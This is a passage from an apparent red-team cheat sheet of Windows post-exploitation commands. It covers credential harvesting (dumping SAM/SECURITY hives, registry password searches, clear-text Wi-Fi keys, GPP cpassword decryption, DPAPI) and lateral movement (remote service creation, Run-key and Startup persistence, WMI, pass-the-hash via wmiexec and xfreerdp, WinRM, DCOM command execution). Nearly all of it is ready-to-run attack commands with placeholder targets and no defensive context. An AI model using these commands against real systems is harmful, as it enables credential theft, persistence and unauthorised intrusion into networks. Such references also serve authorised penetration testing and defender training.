            ~> reg save HKLM\SECURITY %TEMP%\SECURITY.bak

            ~> reg query HKLM /f password /t REG_SZ /s
            ~> reg query HKCU /f password /t REG_SZ /s

        `` Windows Server 2007

            C:\Windows\System32\config\SAM
            C:\Windows\System32\config\SYSTEM
            C:\Windows\System32\config\RegBack\SAM
            C:\Windows\System32\config\RegBack\SAM.OLD
            C:\Windows\System32\config\RegBack\SYSTEM
            C:\Windows\System32\config\RegBack\SYSTEM.OLD

        `` Windows XP

            C:\Windows\repair\SAM
            C:\Windows\repair\SECURITY
            C:\Windows\repair\system

        `` Other locations

            ~> dir %SYSTEMROOT%\repair\SAM 2>nul
            ~> dir %SYSTEMROOT%\System32\config\RegBack\SAM 2>nul
            ~> dir %SYSTEMROOT%\System32\config\SAM 2>nul
            ~> dir %SYSTEMROOT%\repair\system 2>nul
            ~> dir %SYSTEMROOT%\System32\config\SYSTEM 2>nul
            ~> dir %SYSTEMROOT%\System32\config\RegBack\system 2>nul
            ~> dir /a /b /s SAM.b*

        `` Windows Autologin

            ~> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

        `` Putty

            ~> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

        `` Stored credentials (DPAPI)

            C:\Users\security\AppData\Roaming\Microsoft\Credentials\

            ~$ python /opt/impacket/examples/dpapi.py credential -file credentials

    `` Wireless

        `` Wireless [Source: https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Credential_Access/Wifi_Passwords.txt]

            ~> powershell.exe netsh wlan show profiles|Select-String -Pattern " User Profile"|ForEach-Object{echo $_.Line.split(':')[1].trim()}|ForEach-Object{netsh wlan show profiles name=$_ key=clear}|Select-String -Pattern "Key Content|SSID name"

            -- Windows 10
            ~> powershell.exe (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SID_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

            -- Windows 7 or PS Version 2.0
            ~> (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches | % {$_.Groups[1].Value.Trim()}; $_} |%{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches | % {$_.Groups[1].Value.Trim()}; $_} | %{[PSCustomObject]@{ SID_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

    `` GPP
        ~> findstr /S cpassword \\dc1.DOMAIN\sysvol\*.xml
        ~> ruby gppdecrypt.rb encrypted_output
        ~PS> Get-GPPPassword

`` Lateral Movement

    `` Networking

        `` Opening ports

            ~> netsh firewall add portopening tcp 8888 "httpd"

    `` Enabling psexec

        ~> net use \\VAR_TARGET_HOST\ipc$ VAR_USERNAME /user:VAR_PASSWORD
        ~> sc \\VAR_TARGET_HOST config netdde start= auto
        ~> sc \\VAR_TARGET_HOST config netddedsdm start= auto
        ~> sc \\VAR_TARGET_HOST config clipsrv start= auto
        ~> sc \\VAR_TARGET_HOST start netdde
        ~> sc \\VAR_TARGET_HOST start netddedsdm
        ~> sc \\VAR_TARGET_HOST start clipserv

    `` Services

        ~> sc \\VAR_TARGET_HOST create VAR_STRING binpath= "c:\Windows\Temp\foobar.exe"
        ~> sc \\VAR_TARGET_HOST start VAR_STRING
        ~> sc \\VAR_TARGET_HOST delete VAR_STRING

    `` Registry

        `` Command will run every time a user logs in as the user

            ~> reg add "\\VAR_TARGET_HOST\HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VAR_STRING" /t REG_SZ /d "VAR_STRING"

        `` Query the remote registry

            ~> reg query "\\VAR_TARGET_HOST\HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VAR_STRING"

        `` Delete the remote registry

            ~> reg delete "\\VAR_TARGET_HOST\HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "VAR_STRING"

    `` Startup

        `` Executes every time a user logs in

            ~> xcopy foobar.exe "\\VAR_TARGET_HOST\C$\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat"

    `` WMI

        `` Windows

            ~> wmic /node:computername /user:VAR_DOMAIN\VAR_USERNAME path win32_process call create "VAR_STRING"
            ~> wmic /node:@textfile /user:VAR_DOMAIN\VAR_USERNAME path win32_process call create "VAR_STRING"

        `` Linux

            ~$ pth-winexe -U VAR_DOMAIN/VAR_HASH //VAR_TARGET_HOST cmd.exe
            ~$ wmiexec.py -hashes VAR_HASH VAR_USERNAME@VAR_TARGET_HOST
            ~$ wmiexec.py -hashes VAR_HASH VAR_DOMAIN/Administrator@VAR_TARGET_HOST "taskkill /f /fi \"USERNAME eq Administrator\""

    `` RDP

        ~$ xfreerpd /u:VAR_USERNAME /d:VAR_DOMAIN /pth:VAR_HASH /v:VAR_TARGET_HOST

    `` WinRM

        `` Configure the remote machine to work with WinRM

            ~PS> Enable-PSRemoting -Force

        `` Testing the WinRM Connection

            ~PS> Test-WSMan VAR_TARGET_HOST

        `` Adding Trusted Host in WinRM

            ~> winrm set winrm/config/client @{TrustedHosts="VAR_ATTACKER_HOST"}

        `` Execute commands using Powershell Invoke-Command on the target over WinRM

            ~PS> Invoke-Command -ComputerName VAR_TARGET_HOST -ScriptBlock {ipconfig /all}

        `` Interactive session

            ~PS> C:\> Enter-PSSession -ComputerName VAR_TARGET_HOST
            ~PS> C:\> Enter-PSSession -ComputerName VAR_TARGET_HOST -credential VAR_DOMAIN\VAR_USERNAME switch

        `` Disable Powershell Remoting

            ~PS> C:\Windows\system32> Disable-PSRemoting

    `` DCOM

        `` DCOM applications via MMC Application Class (MMC20.Application)

            ~PS> $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","IPAddress"))
            ~PS> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)

        `` DCOM via ShellExecute

            ~PS> $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"IPAddress")
            ~PS> $obj = [System.Activator]::CreateInstance($com)
            ~PS> $item = $obj.Item()
            ~PS> $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)

        `` DCOM via ShellBrowserWindow (Windows 10)

            ~PS> $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"IPAddress")
            ~PS> $obj = [System.Activator]::CreateInstance($com)
            ~PS> $obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)

    `` Shutdown

        ~> net rpc shutdown -I VAR_TARGET_IP -U VAR_USERNAME%VAR_PASSWORD

`` Environment Variables

    - %ALLUSERSPROFILE%
    - %COMPUTERNAME%
    - %COMSPEC%
    - %DATE%
    - %HOMEDRIVE%
    - %HOMEPATH%
    - %HOMESHARE%
    - %LOGONSEVER%
    - %PATH%
    - %PATHEXT%
    - %RANDOM%
    - %SYSTEM32%
    - %SYSTEMDRIVE%
    - %SYSTEMROOT%
    - %TEMP%
    - %TIME%
    - %USERDOMAIN%
    - %USERNAME%
    - %USERPROFILE%
    - %USERSID%
    - %WINDIR%

`` Research

    `` System-wide proxy

        `` Enable

            ~> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d 127.0.0.1:8080 /f
            ~> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f

        `` Disable

            ~> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f
